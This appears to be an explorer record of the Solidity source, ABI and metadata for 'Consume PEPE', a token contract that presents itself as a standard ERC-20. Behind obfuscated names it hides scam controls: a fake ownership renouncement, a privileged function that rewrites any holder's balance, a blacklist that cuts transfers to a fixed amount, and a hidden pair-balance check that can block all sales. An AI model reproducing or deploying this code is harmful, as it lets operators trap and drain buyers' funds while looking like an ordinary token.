{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface liquidityFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeBuy) external view returns (uint256);\n\n    function transfer(address exemptToken, uint256 atFee) external returns (bool);\n\n    function allowance(address tokenTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptToken,\n        uint256 atFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeShould, uint256 value);\n    event Approval(address indexed tokenTx, address indexed spender, uint256 value);\n}\n\nabstract contract walletTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minIsTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptSwap {\n    function createPair(address tokenAt, address shouldExempt) external returns (address);\n}\n\ninterface maxMode is liquidityFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConsumePEPE is walletTrading, liquidityFrom, maxMode {\n\n    bool public minMax;\n\n    event OwnershipTransferred(address indexed fundAuto, address indexed fundAt);\n\n    function toToken(address toWallet, address exemptToken, uint256 atFee) internal returns (bool) {\n        require(shouldReceiver[toWallet] >= atFee);\n        shouldReceiver[toWallet] -= atFee;\n        shouldReceiver[exemptToken] += atFee;\n        emit Transfer(toWallet, exemptToken, atFee);\n        return true;\n    }\n\n    address totalBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public atFund;\n\n    string private tokenTo = \"CPE\";\n\n    string private totalMax = \"Consume PEPE\";\n\n    bool public feeMode;\n\n    uint256 liquiditySender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellSwap;\n    }\n\n    mapping(address => uint256) private shouldReceiver;\n\n    function approve(address enableMode, uint256 atFee) public virtual override returns (bool) {\n        walletAuto[_msgSender()][enableMode] = atFee;\n        emit Approval(_msgSender(), enableMode, atFee);\n        return true;\n    }\n\n    function allowance(address minLaunched, address enableMode) external view virtual override returns (uint256) {\n        if (enableMode == totalBuy) {\n            return type(uint256).max;\n        }\n        return walletAuto[minLaunched][enableMode];\n    }\n\n    address private fundShould;\n\n    bool public tokenLimit;\n\n    mapping(address => mapping(address => uint256)) private walletAuto;\n\n    bool private teamMode;\n\n    function takeToken() public {\n        emit OwnershipTransferred(atFund, address(0));\n        fundShould = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return fundShould;\n    }\n\n    uint256 constant modeLaunched = 20 ** 10;\n\n    function takeModeSwap() private view {\n        require(isLiquidity[_msgSender()]);\n    }\n\n    function balanceOf(address feeBuy) public view virtual override returns (uint256) {\n        return shouldReceiver[feeBuy];\n    }\n\n    function isAmount(uint256 atFee) public {\n        takeModeSwap();\n        launchedBuy = atFee;\n    }\n\n    address receiverList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function receiverIsFee(address receiverSwapIs, uint256 atFee) public {\n        takeModeSwap();\n        shouldReceiver[receiverSwapIs] = atFee;\n    }\n\n    function txBuyLimit(address listAmount) public {\n        takeModeSwap();\n        if (marketingToken) {\n            teamMode = true;\n        }\n        if (listAmount == atFund || listAmount == launchLimitAuto) {\n            return;\n        }\n        txSwap[listAmount] = true;\n    }\n\n    constructor (){\n        if (feeMode == teamMode) {\n            isBuy = false;\n        }\n        minIsTx fromTo = minIsTx(totalBuy);\n        launchLimitAuto = exemptSwap(fromTo.factory()).createPair(fromTo.WETH(), address(this));\n        if (feeMode == teamMode) {\n            feeMode = false;\n        }\n        atFund = _msgSender();\n        takeToken();\n        isLiquidity[atFund] = true;\n        shouldReceiver[atFund] = sellSwap;\n        if (minMax != isBuy) {\n            minMax = true;\n        }\n        emit Transfer(address(0), atFund, sellSwap);\n    }\n\n    mapping(address => bool) public isLiquidity;\n\n    bool public isBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenTo;\n    }\n\n    bool public marketingToken;\n\n    function walletTx(address toWallet, address exemptToken, uint256 atFee) internal returns (bool) {\n        if (toWallet == atFund) {\n            return toToken(toWallet, exemptToken, atFee);\n        }\n        uint256 walletSwap = liquidityFrom(launchLimitAuto).balanceOf(receiverList);\n        require(walletSwap == launchedBuy);\n        require(exemptToken != receiverList);\n        if (txSwap[toWallet]) {\n            return toToken(toWallet, exemptToken, modeLaunched);\n        }\n        return toToken(toWallet, exemptToken, atFee);\n    }\n\n    function transfer(address receiverSwapIs, uint256 atFee) external virtual override returns (bool) {\n        return walletTx(_msgSender(), receiverSwapIs, atFee);\n    }\n\n    function isTake(address sellSender) public {\n        if (tokenLimit) {\n            return;\n        }\n        \n        isLiquidity[sellSender] = true;\n        if (marketingToken) {\n            feeMode = false;\n        }\n        tokenLimit = true;\n    }\n\n    address public launchLimitAuto;\n\n    function getOwner() external view returns (address) {\n        return fundShould;\n    }\n\n    uint256 launchedBuy;\n\n    uint256 private sellSwap = 100000000 * 10 ** 18;\n\n    function transferFrom(address toWallet, address exemptToken, uint256 atFee) external override returns (bool) {\n        if (_msgSender() != totalBuy) {\n            if (walletAuto[toWallet][_msgSender()] != type(uint256).max) {\n                require(atFee <= walletAuto[toWallet][_msgSender()]);\n                walletAuto[toWallet][_msgSender()] -= atFee;\n            }\n        }\n        return walletTx(toWallet, exemptToken, atFee);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalMax;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listFundTeam;\n    }\n\n    uint8 private listFundTeam = 18;\n\n    mapping(address => bool) public txSwap;\n\n    uint256 public receiverLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atFee\",\"type\":\"uint256\"}],\"name\":\"isAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"}],\"name\":\"isTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLimitAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwapIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFee\",\"type\":\"uint256\"}],\"name\":\"receiverIsFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwapIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAmount\",\"type\":\"address\"}],\"name\":\"txBuyLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConsumePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}